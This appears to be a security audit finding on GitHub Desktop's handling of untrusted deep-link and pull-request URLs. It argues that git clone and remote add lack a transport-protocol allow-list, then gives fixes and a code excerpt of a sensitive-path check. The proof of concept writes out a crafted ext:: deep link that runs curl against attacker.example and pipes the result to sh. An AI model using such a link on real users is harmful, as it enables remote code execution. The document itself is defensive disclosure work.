## Confirmed Analog: No Git Transport-Protocol Allow-List When Cloning/Adding Remotes From Attacker-Controlled URLs

### Title
Deep-link/PR-driven `git clone` and `git remote add` accept dangerous transport schemes (`ext::`, `fd::`, `file://`) with no `GIT_ALLOW_PROTOCOL` restriction, enabling code execution or local file exfiltration - (File: `app/src/lib/git/clone.ts`, `app/src/lib/git/remote.ts`)

### Summary
The Sherlock report's broken invariant is: *external, attacker-influenced input is trusted and consumed without a mandatory safety check that upstream guidance says must exist* (Chainlink's Sequencer Uptime Feed check). The direct Desktop analog is the missing Git "trusted protocol" allow-list: Desktop invokes `git clone` and `git remote add`/`set-url` with URLs that originate from untrusted sources (a custom-protocol deep link, or a GitHub Pull Request API object) without ever restricting which Git transport helper (`http`, `https`, `ssh`, `git`, `ext::`, `fd::`, `file://`, etc.) is allowed, the same way upstream Git and GitHub CLI enforce `GIT_ALLOW_PROTOCOL`/`protocol.*.allow=user` after CVE-2017-1000117.

### Finding Description
Two independent code paths hand a fully attacker-influenced string straight to the `git` CLI as a remote URL:

1. **Deep link → clone**: `parseAppURL` in [1](#0-0)  extracts an arbitrary `url` string from an `x-github-client://openRepo/<url>` link (only `pr` and `branch` params are regex-validated; `url` is not). This flows through `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository(url)` [2](#0-1)  which opens the Clone dialog pre-filled with `initialURL: url` [3](#0-2) . Once the user clicks "Clone" (the ordinary, expected next step of the flow triggered by the link), the URL is passed unmodified into `clone()`: [4](#0-3) 

2. **Pull-request fork → remote add**: `_findPullRequestBranch` takes `headCloneUrl` directly from the GitHub API's PR payload (`pullRequest.head.repo.clone_url`) and calls `addRemote(repository, forkRemoteName, headCloneUrl)` with no scheme validation: [5](#0-4) [6](#0-5) 

In both cases the URL is forwarded to `git(...)` in `core.ts`, and the only environment hardening applied is proxy/auth configuration in `envForRemoteOperation`: [7](#0-6) 

Nowhere in `envForRemoteOperation`, `envForProxy`, or the `git()` wrapper is `GIT_ALLOW_PROTOCOL` set or a check performed to reject non-`http(s)`/`ssh` schemes. Git natively supports "remote helper" transports invoked via a URL prefix, most notably `ext::<command>` (executes an arbitrary command as the transport) and `fd::<n>` (uses raw file descriptors), plus `file://` (reads/writes arbitrary local paths, including symlink-based traversal during checkout). Since Git 2.11.1 these are meant to be blocked by default for "un-trusted" sources via `protocol.ext.allow`/`GIT_ALLOW_PROTOCOL`, but Desktop's Git invocation layer never sets this. The `isClonePathSensitive` check in `clone.ts` only guards the *destination directory*, not the *source URL scheme* — it does not stop the invariant break here: [8](#0-7) 

Similarly, `envForProxy` only special-cases `http(s)` URLs for proxy resolution and simply returns undefined/no-op for anything else — it performs no validation or rejection of dangerous schemes: [9](#0-8) 

### Impact Explanation
If an attacker can get a user to click a `x-github-client://openRepo/ext::sh -c '<payload>'` link (or convince/trick them through the normal "Clone" confirmation, which is the expected user action for this feature) or can make a PR's `head.repo.clone_url` resolve to an `ext::`/`file://` value that the app trusts, `git clone`/`git remote add` followed by any subsequent fetch will execute the attacker's command via the `ext::` helper, or read/exfiltrate arbitrary local files via `file://` with symlinked working trees. This is full renderer-adjacent-to-host command execution outside of any Electron sandbox concerns — a direct code-execution primitive triggered purely by a crafted deep link/API object, matching the class of "attacker controls a link/deep link/GitHub API object → code execution or read outside repo" called out as in-scope.

### Likelihood Explanation
Medium-high: `x-github-client://` is a registered OS-level protocol handler (`possibleProtocols`) that any web page or received message can invoke with `window.location`/`<a href>` [10](#0-9) ; `parseAppURL` performs no scheme allow-listing on the `url` field itself [1](#0-0) , only on `branch`/`pr`. The PR-remote path is triggered automatically as part of the normal "Checkout PR" workflow with no user visibility into the raw `clone_url` value. No local access, prior malware, or leaked credentials are required — only a link click or a PR checkout, both ordinary user actions.

### Recommendation
- Enforce a protocol allow-list (`GIT_ALLOW_PROTOCOL=http:https:ssh:git` or equivalent `-c protocol.ext.allow=never -c protocol.fd.allow=never -c protocol.file.allow=never`) in `envForRemoteOperation`/`git()` for every remote-touching invocation (`clone`, `remote add`, `set-url`, `fetch`, `ls-remote`).
- Validate/parse the `url` extracted in `parseAppURL` and the `headCloneUrl` from PR API responses against `parseRemote`'s known `https`/`ssh` patterns before ever reaching `addRemote`/`clone`, rejecting anything that doesn't match a recognized GitHub-style remote.
- Add regression tests asserting that `ext::`, `fd::`, and `file://` URLs are rejected by `clone()` and `addRemote()`.

### Proof of Concept
1. Host or send a link: `x-github-client://openRepo/ext::sh -c "curl attacker.example/x|sh"`.
2. Victim (with GitHub Desktop registered as the protocol handler) clicks the link; `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "curl attacker.example/x|sh"', branch: null, pr: null, filepath: null }` since only `branch`/`pr` are validated [1](#0-0) .
3. `openRepositoryFromUrl` → `openOrCloneRepository` opens the Clone dialog pre-populated with this value as `initialURL` [2](#0-1) .
4. User clicks "Clone" (the natural completion of the deep-link flow); `clone()` runs `git ... clone --recursive -- "ext::sh -c \"curl attacker.example/x|sh\"" <path>` with no `GIT_ALLOW_PROTOCOL` restriction [4](#0-3) , and Git's `ext::` helper executes the embedded shell command with the user's privileges.

**Note on confidence**: I could not fully verify at runtime whether the bundled `dugite`/system Git in this build has `protocol.ext.allow` defaulting to `user` (blocked) or `always` in the exact packaged Git version, since that config lives outside the indexed source; a background Devin session with terminal access should confirm the effective default and exploit end-to-end.

/**
 * Check whether a resolved clone path targets a sensitive location that
 * should never be used as a clone destination. This is a backstop against
 * path traversal attacks where a crafted URL tricks the UI into deriving
 * a clone path outside the intended base directory.
 */
function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
